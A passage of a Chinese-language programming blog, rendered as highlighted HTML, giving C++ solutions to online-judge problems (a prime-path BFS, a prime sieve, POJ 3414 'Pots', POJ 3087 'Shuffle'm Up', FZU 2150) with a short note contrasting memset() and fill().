class="hljs-type">bool</span> <span class="hljs-title">canChange</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>, ag, bg;<br>    <span class="hljs-keyword">while</span> (a)<br>    &#123;<br>        ag = a % <span class="hljs-number">10</span>;<br>        a /= <span class="hljs-number">10</span>;<br>        bg = b % <span class="hljs-number">10</span>;<br>        b /= <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">if</span> (ag != bg)<br>            num++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> num == <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> x, step;<br>&#125;;<br>queue&lt;node&gt; q;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(vis, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(vis));<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>())<br>        q.<span class="hljs-built_in">pop</span>();<br>    q.<span class="hljs-built_in">push</span>(node&#123;a, <span class="hljs-number">0</span>&#125;);<br>    vis[a] = <span class="hljs-literal">true</span>;<br>    node now;<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        now = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">if</span> (now.x == b)<br>            <span class="hljs-keyword">return</span> now.step;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">canChange</span>(prime[i], now.x) &amp;&amp; !vis[prime[i]])<br>            &#123;<br>                q.<span class="hljs-built_in">push</span>(node&#123;prime[i], now.step + <span class="hljs-number">1</span>&#125;);<br>                vis[prime[i]] = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t = <span class="hljs-built_in">readint</span>();<br>    <span class="hljs-type">int</span> a, b, ans;<br>    <span class="hljs-built_in">getP</span>();<br>    <span class="hljs-keyword">while</span> (t--)<br>    &#123;<br>        a = <span class="hljs-built_in">readint</span>();<br>        b = <span class="hljs-built_in">readint</span>();<br>        ans = <span class="hljs-built_in">bfs</span>(a, b);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, ans);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意<code>fill()</code>与<code>memset()</code>函数的区别</p><ul><li><code>memset()</code><ul><li>按照字节填充某字符</li><li>在头文件<code>&lt;cstring&gt;</code>里面</li></ul></li><li><code>fill()</code><ul><li>按照单元赋值，将一个区间的元素都赋同一个值</li><li>在头文件<code>&lt;algorithm&gt;</code>里面</li></ul></li><li>因为<code>memset()</code>按照字节填充，所以一般memset只能用来填充char型数组，（因为只有char型占一个字节）如果填充int型数组，除了0和-1，其他的不能。因为只有00000000 = 0，-1同理，如果我们把每一位都填充“1”，会导致变成填充入“11111111”</li><li>而<code>fill()</code>可以赋值任何，而且使用方法特别简便：<ul><li>fill(arr, arr + n, 要填入的内容);</li></ul></li></ul><p>素数筛：简单来说就是把一个数的倍数全部删掉，留下的就是素数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">prime</span><span class="hljs-params">()</span><span class="hljs-comment">//这个函数可以将1~100010内的所有素数都找出来，所以在main()函数开头执行一遍就行了 </span></span><br><span class="hljs-function"></span>&#123;<br>isPrime[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;<span class="hljs-number">100010</span>;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">2</span>*i;j&lt;<span class="hljs-number">100010</span>;j+=i)<br>isPrime[j] = <span class="hljs-number">1</span>;<span class="hljs-comment">//某个数的倍数肯定不是素数 </span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Pots：Pots-POJ-3414-Virtual-Judge-vjudge-net"><a href="#Pots：Pots-POJ-3414-Virtual-Judge-vjudge-net" class="headerlink" title="Pots：Pots - POJ 3414 - Virtual Judge (vjudge.net)"></a>Pots：<a href="https://vjudge.net/problem/POJ-3414">Pots - POJ 3414 - Virtual Judge (vjudge.net)</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> a, b, c;<br><span class="hljs-type">int</span> vis[<span class="hljs-number">105</span>][<span class="hljs-number">105</span>];<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> u, v;<br>    <span class="hljs-type">int</span> level;<br>    <span class="hljs-type">int</span> op;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> pre;<br>    <span class="hljs-built_in">node</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3, <span class="hljs-type">int</span> a4, <span class="hljs-type">int</span> a5)<br>    &#123;<br>        u = a;<br>        v = a1; <span class="hljs-comment">//两个被子的其中的水量</span><br>        level = a2;<br>        op = a3;  <span class="hljs-comment">//执行的操作</span><br>        id = a4;  <span class="hljs-comment">//次数</span><br>        pre = a5; <span class="hljs-comment">//该状态的上一步在数组中的下标</span><br>    &#125;<br>&#125;;<br><br>vector&lt;node&gt; arr;<br><span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ans;<br><br>string str[] = &#123;<span class="hljs-string">&quot;FILL(1)&quot;</span>, <span class="hljs-string">&quot;FILL(2)&quot;</span>, <span class="hljs-string">&quot;DROP(1)&quot;</span>, <span class="hljs-string">&quot;DROP(2)&quot;</span>, <span class="hljs-string">&quot;POUR(1,2)&quot;</span>, <span class="hljs-string">&quot;POUR(2,1)&quot;</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    queue&lt;node&gt; cun;<br>    cun.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">node</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>));<br>    arr.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">node</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>));<br>    <span class="hljs-built_in">memset</span>(vis, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(vis));<br>    vis[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    cnt++;<br>    ans = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span> (!cun.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        node tmp = cun.<span class="hljs-built_in">front</span>();<br>        cun.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">if</span> (tmp.u == c || tmp.v == c)<br>        &#123;<br>            ans = tmp.id;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) <span class="hljs-comment">//fill a</span><br>            &#123;<br>                <span class="hljs-keyword">if</span> (a - tmp.u &gt; <span class="hljs-number">0</span> &amp;&amp; vis[a][tmp.v] == <span class="hljs-number">0</span>)<br>                &#123;<br>                    vis[a][tmp.v] = <span class="hljs-number">1</span>;<br>                    <span class="hljs-function">node <span class="hljs-title">n</span><span class="hljs-params">(a, tmp.v, tmp.level + <span class="hljs-number">1</span>, i, cnt, tmp.id)</span></span>;<br>                    cnt++;<br>                    arr.<span class="hljs-built_in">push_back</span>(n);<br>                    cun.<span class="hljs-built_in">push</span>(n);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>) <span class="hljs-comment">//fill b</span><br>            &#123;<br>                <span class="hljs-keyword">if</span> (b - tmp.v &gt; <span class="hljs-number">0</span> &amp;&amp; vis[tmp.u][b] == <span class="hljs-number">0</span>)<br>                &#123;<br>                    vis[tmp.u][b] = <span class="hljs-number">1</span>;<br>                    <span class="hljs-function">node <span class="hljs-title">n</span><span class="hljs-params">(tmp.u, b, tmp.level + <span class="hljs-number">1</span>, i, cnt, tmp.id)</span></span>;<br>                    cnt++;<br>                    arr.<span class="hljs-built_in">push_back</span>(n);<br>                    cun.<span class="hljs-built_in">push</span>(n);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">2</span>) <span class="hljs-comment">//倒a</span><br>            &#123;<br>                <span class="hljs-keyword">if</span> (tmp.u &gt; <span class="hljs-number">0</span> &amp;&amp; vis[<span class="hljs-number">0</span>][tmp.v] == <span class="hljs-number">0</span>)<br>                &#123;<br>                    vis[<span class="hljs-number">0</span>][tmp.v] = <span class="hljs-number">1</span>;<br>                    <span class="hljs-function">node <span class="hljs-title">n</span><span class="hljs-params">(<span class="hljs-number">0</span>, tmp.v, tmp.level + <span class="hljs-number">1</span>, i, cnt, tmp.id)</span></span>;<br>                    cnt++;<br>                    arr.<span class="hljs-built_in">push_back</span>(n);<br>                    cun.<span class="hljs-built_in">push</span>(n);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">3</span>) <span class="hljs-comment">//d b</span><br>            &#123;<br>                <span class="hljs-keyword">if</span> (tmp.v &gt; <span class="hljs-number">0</span> &amp;&amp; vis[tmp.u][<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>)<br>                &#123;<br>                    vis[tmp.u][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>                    <span class="hljs-function">node <span class="hljs-title">n</span><span class="hljs-params">(tmp.u, <span class="hljs-number">0</span>, tmp.level + <span class="hljs-number">1</span>, i, cnt, tmp.id)</span></span>;<br>                    cnt++;<br>                    arr.<span class="hljs-built_in">push_back</span>(n);<br>                    cun.<span class="hljs-built_in">push</span>(n);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">4</span>) <span class="hljs-comment">//1-&gt;2</span><br>            &#123;<br>                <span class="hljs-keyword">if</span> (tmp.u != <span class="hljs-number">0</span> &amp;&amp; tmp.v != b)<br>                &#123;<br>                    <span class="hljs-type">int</span> dao = <span class="hljs-built_in">min</span>(b - tmp.v, tmp.u);<br>                    <span class="hljs-keyword">if</span> (vis[tmp.u - dao][tmp.v + dao] == <span class="hljs-number">0</span>)<br>                    &#123;<br>                        vis[tmp.u - dao][tmp.v + dao] = <span class="hljs-number">1</span>;<br>                        <span class="hljs-function">node <span class="hljs-title">n</span><span class="hljs-params">(tmp.u - dao, tmp.v + dao, tmp.level + <span class="hljs-number">1</span>, i, cnt, tmp.id)</span></span>;<br>                        cnt++;<br>                        arr.<span class="hljs-built_in">push_back</span>(n);<br>                        cun.<span class="hljs-built_in">push</span>(n);<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (tmp.v != <span class="hljs-number">0</span> &amp;&amp; tmp.u != a)<br>                &#123;<br>                    <span class="hljs-type">int</span> dao = <span class="hljs-built_in">min</span>(a - tmp.u, tmp.v);<br>                    <span class="hljs-keyword">if</span> (vis[tmp.u + dao][tmp.v - dao] == <span class="hljs-number">0</span>)<br>                    &#123;<br>                        vis[tmp.u + dao][tmp.v - dao] = <span class="hljs-number">1</span>;<br>                        <span class="hljs-function">node <span class="hljs-title">n</span><span class="hljs-params">(tmp.u + dao, tmp.v - dao, tmp.level + <span class="hljs-number">1</span>, i, cnt, tmp.id)</span></span>;<br>                        cnt++;<br>                        arr.<span class="hljs-built_in">push_back</span>(n);<br>                        cun.<span class="hljs-built_in">push</span>(n);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ans != <span class="hljs-number">-1</span>)<br>    &#123;<br>        node tmp = arr[ans];<br>        <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br>        stack&lt;<span class="hljs-type">int</span>&gt; arrx;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (tmp.op &gt;= <span class="hljs-number">6</span> || tmp.op &lt; <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            arrx.<span class="hljs-built_in">push</span>(tmp.op);<br>            ans = tmp.pre;<br>            <span class="hljs-keyword">if</span> (ans == <span class="hljs-number">-1</span>)<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            tmp = arr[tmp.pre];<br>            cnt++;<br>        &#125;<br>        cout &lt;&lt; cnt &lt;&lt; endl;<br>        <span class="hljs-keyword">while</span> (!arrx.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-type">int</span> t1 = arrx.<span class="hljs-built_in">top</span>();<br>            arrx.<span class="hljs-built_in">pop</span>();<br>            cout &lt;&lt; str[t1] &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;impossible&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;<br>    <span class="hljs-built_in">bfs</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Shuffle’m-Up-：http-poj-org-problem-id-3087"><a href="#Shuffle’m-Up-：http-poj-org-problem-id-3087" class="headerlink" title="Shuffle’m Up ：http://poj.org/problem?id=3087"></a>Shuffle’m Up ：<a href="http://poj.org/problem?id=3087">http://poj.org/problem?id=3087</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 1010</span><br><span class="hljs-type">char</span> s1[N], s2[N], str[N], shuffle[N], goal[N];<br><span class="hljs-type">int</span> x, n;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> step = <span class="hljs-number">0</span>, x, y, i;<br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        step++;<br>        x = y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span> * n; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)<br>            &#123;<br>                shuffle[i] = s2[x++];<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                shuffle[i] = s1[y++];<br>            &#125;<br>        &#125;<br>        shuffle[<span class="hljs-number">2</span> * n] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(shuffle, goal) == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> step;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(shuffle, str) == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">strncpy</span>(s1, shuffle, n);<br>        s1[n] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-built_in">strncpy</span>(s2, shuffle + n, n);<br>        s2[n] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; x;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> t = <span class="hljs-number">1</span>; t &lt;= x; t++)<br>    &#123;<br>        cin &gt;&gt; n;<br>        cin &gt;&gt; s1 &gt;&gt; s2 &gt;&gt; goal;<br>        <span class="hljs-built_in">strncpy</span>(str, s1, n);<br>        <span class="hljs-built_in">strncpy</span>(str + n, s2, n);<br>        str[<span class="hljs-number">2</span> * n] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        cout &lt;&lt; t &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; <span class="hljs-built_in">dfs</span>() &lt;&lt; endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="FZU-2150"><a href="#FZU-2150" class="headerlink" title="FZU 2150"></a>FZU 2150</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span 